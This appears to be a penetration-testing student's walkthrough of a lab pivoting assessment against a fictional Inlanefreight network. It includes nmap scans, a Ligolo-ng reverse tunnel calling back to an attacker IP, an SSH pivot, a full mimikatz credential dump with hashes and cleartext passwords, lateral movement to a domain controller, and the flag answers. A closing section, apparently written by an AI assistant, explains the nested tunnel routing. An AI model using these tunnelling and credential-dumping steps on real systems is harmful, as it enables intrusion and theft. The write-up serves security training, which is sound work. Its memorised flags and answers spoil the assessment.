**Skills Assessment

**Scenario

A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a web shell in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are below:

**Objectives 

Start from external (Pwnbox or your own VM) and access the first system via the web shell left in place.
Use the web shell access to enumerate and pivot to an internal host.
Continue enumeration and pivoting until you reach the Inlanefreight Domain Controller and capture the associated flag.
Use any data, credentials, scripts, or other information within the environment to enable your pivoting attempts.
Grab any/all flags that can be found.

Q1. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.

```
sudo nmap -sCV 10.129.229.129 -oA nmap         
[sudo] password for satoru: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-15 08:28 +0530
Nmap scan report for 10.129.229.129
Host is up (0.37s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: p0wny@shell:~#
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.51 seconds
                                                              
```

![](Attachments/Pasted%20image%2020260915082935.png)

```
sudo ip tuntap add user $(whoami) mode tun ligolo 
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
sudo ip route add 172.16.0.0/16 dev ligolo

```

```
ans: webadmin

```

Q1. Submit the credentials found in the user's home directory. (Format: user:password)

```
mlefay:Plain Human work!
```

Q3. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.

```
fping -a -g -q 172.16.0.0/16
172.16.5.15
172.16.5.35

```

Q4. Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.

```
sshpass -p 'Plain Human work!' ssh mlefay@172.16.5.35
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html





















Microsoft Windows [Version 10.0.17763.2628]
mlefay@PIVOT-SRV01 C:\Users\mlefay\Desktop>type C:\Flag.txt 
S1ngl3-Piv07-3@sy-Day 
mlefay@PIVOT-SRV01 C:\Users\mlefay\Desktop>

```

Q5. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?

```
mlefay@PIVOT-SRV01 C:\Users\mlefay\Desktop>ipconfig /all | findstr /i "DNS Servers"
   Primary Dns Suffix  . . . . . . . : INLANEFREIGHT.LOCAL
   DNS Suffix Search List. . . . . . : INLANEFREIGHT.LOCAL
   Connection-specific DNS Suffix  . :
   DNS Servers . . . . . . . . . . . : 172.16.10.5
   Connection-specific DNS Suffix  . :
   DNS Servers . . . . . . . . . . . : 


```

```
mlefay@PIVOT-SRV01 C:\Users\mlefay\Desktop>net view \\127.0.0.1 /all
Shared resources at \\127.0.0.1



Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
ADMIN$      Disk           Remote Admin
C$          Disk           Default share
IPC$        IPC            Remote IPC
Users       Disk
The command completed successfully.


mlefay@PIVOT-SRV01 C:\Users\mlefay\Desktop>net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
Users        C:\Users
The command completed successfully.


mlefay@PIVOT-SRV01 C:\Users\mlefay\Desktop>dir C:\Users
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\Users

05/17/2022  11:14 AM    <DIR>          .
05/17/2022  11:14 AM    <DIR>          ..
05/06/2022  03:21 AM    <DIR>          Administrator
05/17/2022  11:09 AM    <DIR>          administrator.INLANEFREIGHT
05/06/2022  02:30 AM    <DIR>          apendragon
10/06/2021  12:31 PM    <DIR>          lab_adm
05/16/2022  01:57 PM    <DIR>          mlefay
10/06/2021  03:46 PM    <DIR>          Public
05/23/2022  12:14 PM    <DIR>          vfrank
               0 File(s)              0 bytes
               9 Dir(s)  18,628,304,896 bytes free

```

```
mlefay@PIVOT-SRV01 C:\Users\mlefay\Desktop>powershell -Command "Get-CimInstance Win32_Service | 
Where-Object { $_.StartName -like '*vfrank*' } | Select-Object Name, DisplayName, StartName, Sta
te, PathName | Format-Table -AutoSize"

Name       DisplayName StartName            State   PathName
----       ----------- ---------            -----   --------
DHCPServer DHCP Server INLANEFREIGHT\vfrank Running C:\Windows\system32\svchost.exe -k DHCPS... 
SCardSvr   Smart Card  INLANEFREIGHT\vfrank Stopped C:\Windows\system32\svchost.exe -k Local... 



```

DHCP is the vuln service.

```
sshpass -p 'Plain Human work!' scp -v -O /home/satoru/Desktop/Tools_CPTS/mimikatz-master/x64/mimikatz.exe mlefay@172.16.5.35:C:/Users/mlefay/Desktop/
```

```
PS C:\Users\mlefay\Desktop> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" 

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz(commandline) # privilege::debug 
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 74023 (00000000:00012127)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/15/2026 1:10:18 AM
SID               : S-1-5-90-0-1 
        msv :
         [00000003] Primary
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
        tspkg :
        wdigest :        
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT.LOCAL 
         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9
\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : PIVOT-SRV01$
Domain            : INLANEFREIGHT 
Logon Server      : (null)
Logon Time        : 9/15/2026 1:10:16 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : pivot-srv01$ 
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9
\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
        ssp :
        credman :

Authentication Id : 0 ; 162989 (00000000:00027cad)
Session           : Service from 0
User Name         : vfrank 
Domain            : INLANEFREIGHT
Logon Server      : ACADEMY-PIVOT-D
Logon Time        : 9/15/2026 1:10:44 AM
SID               : S-1-5-21-3858284412-1730064152-742000644-1103
        msv :
         [00000003] Primary
         * Username : vfrank 
         * Domain   : INLANEFREIGHT
         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4 
        tspkg :
        wdigest :
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : vfrank
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Imply wet Unmasked!
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4) 
Session           : Service from 0
User Name         : PIVOT-SRV01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 9/15/2026 1:10:17 AM
SID               : S-1-5-20 
        msv :
         [00000003] Primary
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
        tspkg :  
        wdigest :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : pivot-srv01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9
\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7# 
        ssp :
        credman :

Authentication Id : 0 ; 44322 (00000000:0000ad22)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 9/15/2026 1:10:17 AM 
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527 
        tspkg :
        wdigest :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9
\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
        ssp :
        credman :

Authentication Id : 0 ; 44271 (00000000:0000acef)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host 
Logon Server      : (null)
Logon Time        : 9/15/2026 1:10:17 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476 
         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
        tspkg :
        wdigest :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * Password : (null) 
        kerberos :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9
\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
        ssp :
        credman :

Authentication Id : 0 ; 774839 (00000000:000bd2b7) 
Session           : NetworkCleartext from 0
User Name         : mlefay
Domain            : PIVOT-SRV01
Logon Server      : PIVOT-SRV01
Logon Time        : 9/15/2026 1:17:52 AM
SID               : S-1-5-21-1602415334-2376822715-119304339-1003
        msv :
         [00000003] Primary
         * Username : mlefay 
         * Domain   : PIVOT-SRV01
         * NTLM     : 2831bf1e4e0841d882328d5481fb5c92
         * SHA1     : ccb38ae19c47a04fa01542f30466d6c48ddc18d7
        tspkg :
        wdigest :
         * Username : mlefay
         * Domain   : PIVOT-SRV01 
         * Password : (null)
        kerberos :
         * Username : mlefay
         * Domain   : PIVOT-SRV01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 774281 (00000000:000bd089)
Session           : Service from 0
User Name         : sshd_2380
Domain            : VIRTUAL USERS 
Logon Server      : (null)
Logon Time        : 9/15/2026 1:17:51 AM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-2380
        msv :
         [00000003] Primary
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476 
         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
        tspkg :
        wdigest :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * Password : (null) 
        kerberos :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9
\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5) 
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/15/2026 1:10:18 AM
SID               : S-1-5-19
        msv :
        tspkg :  
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 74042 (00000000:0001213a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/15/2026 1:10:18 AM 
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527 
        tspkg :
        wdigest :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
        kerberos :
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : z4PN$Qc?h1n'mI`r<dzJ:-S?dbm.tA:ANPnGG]1h8,Gb[#Gx`SJj3DOBCwhJW^LMUKkPQb!(P9
\<$VDLWL+UL4KDZ&lh^Z_[OEj;Is4= 1GOR+3h<U/a[Q7#
        ssp :
        credman :

Authentication Id : 0 ; 43124 (00000000:0000a874)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 9/15/2026 1:10:16 AM
SID               :
        msv :
         [00000003] Primary
         * Username : PIVOT-SRV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : 21ce18b1a025d4b0b01c0e716e99d476
         * SHA1     : 0f6097d8c745b1addfdfbbe733c1948e5d929527
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
PS C:\Users\mlefay\Desktop>
PS C:\Users\mlefay\Desktop> 

```

```
xfreerdp /v:172.16.5.35 /u:'mlefay' /p:'Plain Human work!' /drive:tools,/home/satoru/Desktop/Tools_CPTS /cert:ignore +clipboard /dynamic-resolution
```

```
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```

![](Attachments/Pasted%20image%2020260915125306.png)
Q6. For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.

```
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is C41A-F2ED

 Directory of C:\

05/17/2022  12:38 PM                23 Flag.txt
12/14/2020  08:22 PM    <DIR>          PerfLogs
04/27/2022  07:19 AM    <DIR>          Program Files
04/27/2022  07:18 AM    <DIR>          Program Files (x86)
05/17/2022  09:15 AM    <DIR>          Users
05/18/2022  10:41 AM    <DIR>          Windows
               1 File(s)             23 bytes
               5 Dir(s)  12,771,028,992 bytes free

C:\>whoami
inlanefreight\vfrank
```


Q7. Submit the contents of C:\Flag.txt located on the Domain Controller.
```
PS C:\> $env:LOGONSERVER
\\ACADEMY-PIVOT-D
```

```
Enter-PSSession -ComputerName ACADEMY-PIVOT-D -Credential inlanefreight\vfrank  
Imply wet Unmasked!
```

```
[ACADEMY-PIVOT-D]: PS C:\Users\vfrank\Documents> cd C:\
[ACADEMY-PIVOT-D]: PS C:\> ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:12 AM                PerfLogs
d-r---       12/14/2020   6:43 PM                Program Files
d-----        9/15/2018  12:21 AM                Program Files (x86)
d-r---        9/15/2026  12:28 AM                Users
d-----         5/3/2022  10:09 AM                Windows
-a----        5/18/2022   1:33 PM             20 Flag.txt.txt


[ACADEMY-PIVOT-D]: PS C:\> type  Flag.txt.txt
3nd-0xf-Th3-R@inbow!
[ACADEMY-PIVOT-D]: PS C:\>
```



## Step 1: Established the First Pivot (Target 1)

You started by running a Ligolo agent on the first compromised machine (`webadmin@inlanefreight.local`). It connected back to your Kali attack machine.

- What this achieved: Your Kali Linux machine gained direct access to the first internal network (`172.16.5.0/24`) using your primary virtual network interface named `ligolo`.

## Step 2: Set Up Target 1 as a Relay Station

Because the deeper machine (`PIVOT-SRV01`) could not see your Kali machine directly, you had to turn Target 1 into a traffic relay. You ran this inside your Ligolo-ng proxy prompt:

```text
ligolo-ng (session 1) >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```

- Explanation: This told the `webadmin` agent to open up port `11601` on its own internal interface. Anything that connected to it from the deep network would automatically get forwarded straight back through the existing tunnel to your Kali machine.

## Step 3: Connected the Deep Agent (`PIVOT-SRV01`)

You executed the Ligolo agent on the nested machine (`PIVOT-SRV01`). Crucially, you didn't point it to Kali; you pointed it to Target 1's internal IP address.

- Explanation: The agent connected to Target 1, which seamlessly forwarded the connection back to your Kali machine. The Ligolo terminal alerted you: `INFO Agent joined. name="PIVOT-SRV01..."`.

## Step 4: Solved the Interface Name Collision

When you selected the new session and typed `start`, Ligolo threw the error: _`a tunnel is already using this interface name`_.

- Explanation: By default, Ligolo tries to bind every session to the original `ligolo` network interface. Because the first session was already using it, it caused a collision.
- How we fixed it: You started the tunnel by explicitly naming a separate, secondary interface:
    
    ```text
    [Agent : PIVOT-SRV01...] » start --tun ligolo2
    ```
    

## Step 5: Overcame the Subnet Mask Trap (`RTNETLINK answers: File exists`)

When you tried to add a route for `172.16.10.0/24`, your Kali terminal rejected it with a `File exists` error. We inspected your Windows `ipconfig` output and found out why: the target machines were using a `/16` subnet mask (`255.255.0.0`).

- Explanation: A `/16` mask means the network covers _everything_ from `172.16.0.0` to `172.16.255.255`. Your Kali machine had already assigned that massive range to the first `ligolo` interface. Kali refused the new command because it thought, _"I already know how to get to 172.16.x.x—it goes to the first tunnel."_

## Step 6: Configured Micro-Routing Hierarchy

To force Kali to send deep network traffic through the _second_ agent instead of the first, we used specific micro-routing rules:

```bash
sudo ip route del 172.16.10.0/24 2>/dev/null
sudo ip route add 172.16.5.0/24 dev ligolo
sudo ip route add 172.16.6.0/24 dev ligolo2
sudo ip route add 172.16.10.0/24 dev ligolo2
```

- Explanation: In networking, more specific routes always win. By carving out smaller `/24` chunks, we told your Kali operating system: _"If traffic is meant for the 5.x range, use the first tunnel (`ligolo`). If it is meant for the 6.x or 10.x ranges, bypass the first rule and send it down the second tunnel (`ligolo2`)."_

---

## The Final Result

Your network architecture now functions as a nested funnel:  
`Kali Linux Tools` → `ligolo2 interface` → `Target 1 (Relay)` → `Target 2 (PIVOT-SRV01)` → `Deep 172.16.6.x / 172.16.10.x networks`.

Now that the double tunnel is fully open and routed, would you like me to provide Nmap or Netexec scan commands optimized to run through this specific dual-interface setup?